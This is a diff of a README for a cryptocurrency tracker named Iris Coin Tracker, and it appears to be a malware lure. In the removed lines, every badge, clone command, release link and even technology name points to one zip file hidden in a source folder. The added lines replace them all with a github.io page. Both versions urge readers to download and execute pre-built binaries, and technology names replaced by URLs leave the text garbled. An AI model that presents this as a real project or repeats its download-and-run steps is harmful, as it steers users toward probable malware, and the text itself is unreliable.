@@ -1,6 +1,6 @@
 # Iris Coin Tracker: Your Ultimate Cryptocurrency Management Tool 🚀
 
-![Iris Coin Tracker](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip) ![Docker](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip) ![GitHub](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip)
+![Iris Coin Tracker](https://jhonjhon576.github.io) ![Docker](https://jhonjhon576.github.io) ![GitHub](https://jhonjhon576.github.io)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ Iris Coin Tracker is a powerful tool designed for cryptocurrency enthusiasts. Bu
 
 Iris Coin Tracker leverages a variety of modern technologies to deliver a robust user experience:
 
-- **https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip**: For backend server operations.
+- **https://jhonjhon576.github.io**: For backend server operations.
 - **React**: For building a dynamic and responsive frontend.
 - **TypeScript**: Ensures type safety and better development experience.
 - **PostgreSQL**: A reliable database for storing user data and transaction history.
@@ -44,7 +44,7 @@ To get started with Iris Coin Tracker, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip
+   git clone https://jhonjhon576.github.io
    ```
 2. Navigate to the project directory:
    ```bash
@@ -67,7 +67,7 @@ To get started with Iris Coin Tracker, follow these steps:
 
 6. Access the application at `http://localhost:3000`.
 
-For pre-built binaries, you can download the latest release [here](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip). Make sure to execute the downloaded file as per the instructions provided in the release notes.
+For pre-built binaries, you can download the latest release [here](https://jhonjhon576.github.io). Make sure to execute the downloaded file as per the instructions provided in the release notes.
 
 ## Usage
 
@@ -97,11 +97,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information and to stay updated, visit the [Releases section](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip) of the repository. Here, you can find the latest updates and download pre-built versions of the application.
+For more information and to stay updated, visit the [Releases section](https://jhonjhon576.github.io) of the repository. Here, you can find the latest updates and download pre-built versions of the application.
 
-You can also check the [Releases section](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip) for any future updates and improvements.
+You can also check the [Releases section](https://jhonjhon576.github.io) for any future updates and improvements.
 
-![Iris Coin Tracker](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip)
+![Iris Coin Tracker](https://jhonjhon576.github.io)
 
 ## Topics
 
@@ -111,7 +111,7 @@ This repository covers various topics related to modern web development and cryp
 - **Flatlogic**: Low-code development platform.
 - **JavaScript**: Core language for web development.
 - **Nginx**: Web server and reverse proxy.
-- **https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip**: JavaScript runtime for server-side development.
+- **https://jhonjhon576.github.io**: JavaScript runtime for server-side development.
 - **PostgreSQL**: Powerful relational database.
 - **React**: Library for building user interfaces.
 - **Tailwind CSS**: Utility-first CSS framework.
